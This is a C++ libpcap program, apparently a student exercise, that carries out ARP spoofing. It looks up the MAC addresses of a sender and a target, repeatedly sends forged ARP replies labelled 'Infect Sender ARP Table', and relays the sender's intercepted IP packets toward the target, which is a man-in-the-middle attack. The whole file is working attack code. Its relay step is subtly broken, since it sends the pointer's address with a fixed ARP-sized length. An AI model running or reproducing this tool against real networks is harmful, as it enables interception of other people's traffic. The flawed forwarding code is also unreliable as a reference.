#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <libnet.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender-ip> <target-ip>\n");
    printf("sample: send-arp-test wlan0 192.168.55.4 192.168.55.1\n");
}

typedef struct interface_Info {
    Mac _mac;
    Ip _ip;
}interfaceInfo;

interfaceInfo GetInterfaceInfo(const char *ifname){
    struct ifreq ifr;
    int sockfd;

    uint8_t mac_addr[6];
    char ip_addr[16];

    interfaceInfo i_info;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0){
        printf("Fail to get interface - socket() failed - %m\n");
        exit(-1);
    }
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0){
        printf("Fail to get interface MAC - ioctl(SIOSCIFHWARDDR) failed - %m\n");
        close(sockfd);
        exit(-1);
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
    i_info._mac = Mac(mac_addr);

    printf("MAC  : %02X:%02X:%02X:%02X:%02X:%02X\n", mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        printf("Fail to get interface IP - ioctl(SIOSCIFHWARDDR) failed - %m\n");
        close(sockfd);
        exit(-1);
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip_addr, sizeof(struct sockaddr));
    i_info._ip = Ip(ip_addr);

    printf("IP   : %s\n", ip_addr);


    close(sockfd);
    return i_info;
}

Mac GetInterfaceMACAddress(const u_char* reply_packet){
    struct libnet_ethernet_hdr* ETH = (struct libnet_ethernet_hdr *) reply_packet;
    uint8_t mac_addr[6];
    Mac _mac;
    int i = 0;

    for (i = 0; i < 6; i++) mac_addr[i] = ETH->ether_shost[i];
    _mac = Mac(mac_addr);

    printf("MAC  : %02X:%02X:%02X:%02X:%02X:%02X\n", mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);
    return _mac;
}

void Send_Packet(pcap_t* handle, Mac _dmac, Mac _smac, Ip _sip, Mac _tmac, Ip _tip, uint16_t _op){
    EthArpPacket packet;

    packet.eth_.dmac_ = _dmac;
    packet.eth_.smac_ = _smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(_op);
    packet.arp_.smac_ = _smac;
    packet.arp_.sip_ = htonl(_sip);
    packet.arp_.tmac_ = _tmac;
    packet.arp_.tip_ = htonl(_tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

const u_char* Catch_Packet(pcap_t* handle){
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    int res = pcap_next_ex(handle, &header, &reply_packet);
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
        exit(-1);
    }
    return reply_packet;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    interfaceInfo AttackerInfo;
    interfaceInfo SenderInfo;
    interfaceInfo TargetInfo;

    printf("==========Attacker Info==========\n");
    AttackerInfo = GetInterfaceInfo(argv[1]);

    // ARP Request
    Send_Packet(handle, Mac("ff:ff:ff:ff:ff:ff"), AttackerInfo._mac, AttackerInfo._ip, Mac("00:00:00:00:00:00"), Ip(argv[2]), ArpHdr::Request);

    // Catched ARP Reply packet
    const u_char* reply_packet = Catch_Packet(handle);

    // Parsing Sender's info
    printf("==========Sender Info==========\n");
    SenderInfo._mac = GetInterfaceMACAddress(reply_packet);
    SenderInfo._ip = Ip(argv[2]);
    printf("IP   : %s\n", argv[2]);

    // ARP Request
    Send_Packet(handle, Mac("ff:ff:ff:ff:ff:ff"), AttackerInfo._mac, AttackerInfo._ip, Mac("00:00:00:00:00:00"), Ip(argv[3]), ArpHdr::Request);

    // Catched ARP Reply packet
    reply_packet = Catch_Packet(handle);

    // Parsing Target's info
    printf("==========Target Info==========\n");
    TargetInfo._mac = GetInterfaceMACAddress(reply_packet);
    TargetInfo._ip = Ip(argv[3]);
    printf("IP   : %s\n", argv[3]);

    struct pcap_pkthdr* header;
    const u_char* packet;
    int period = 1;
    int i;

    while(1){
        if (period % 30 == 1){
            // Infected ARP
            Send_Packet(handle, SenderInfo._mac, AttackerInfo._mac, TargetInfo._ip, SenderInfo._mac, SenderInfo._ip, ArpHdr::Reply);
            printf("[*]    Infect Sender ARP Table\n");
        }

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct EthArpPacket* ETH = (EthArpPacket *) packet;
        struct libnet_ipv4_hdr* IP4 = (struct libnet_ipv4_hdr *)(packet + sizeof(struct libnet_ethernet_hdr));

        if (ETH->eth_.dmac_ == AttackerInfo._mac && ETH->eth_.smac_ == SenderInfo._mac && ntohs(ETH->eth_.type_) == EthHdr::Ip4 && ntohl(IP4->ip_src.s_addr) == SenderInfo._ip){
            printf("dmac = %s\n", std::string(ETH->eth_.dmac_).c_str());
            printf("smac = %s\n", std::string(ETH->eth_.smac_).c_str());

            // setting SMAC = Attacker, DMAC = TARGET
            ETH->eth_.dmac_ = TargetInfo._mac;
            ETH->eth_.smac_ = AttackerInfo._mac;

            printf("Source IP        | ");
            for(i = 24; i >= 8; i -= 8) {
                printf("%d.", (ntohl(IP4->ip_src.s_addr) >> i) & 0xff);
            }
            printf("%d\n", (ntohl(IP4->ip_src.s_addr) >> i) & 0xff);

            printf("Destination IP   | ");
            for(i = 24; i >= 8; i -= 8) {
                printf("%d.", (ntohl(IP4->ip_dst.s_addr) >> i) & 0xff);
            }
            printf("%d\n", (ntohl(IP4->ip_dst.s_addr) >> i) & 0xff);

            printf("set dmac = %s\n", std::string(ETH->eth_.dmac_).c_str());
            printf("set smac = %s\n", std::string(ETH->eth_.smac_).c_str());
            printf("Rely Packet\n\n");

            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ETH), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
        period ++;
    }

    pcap_close(handle);
}







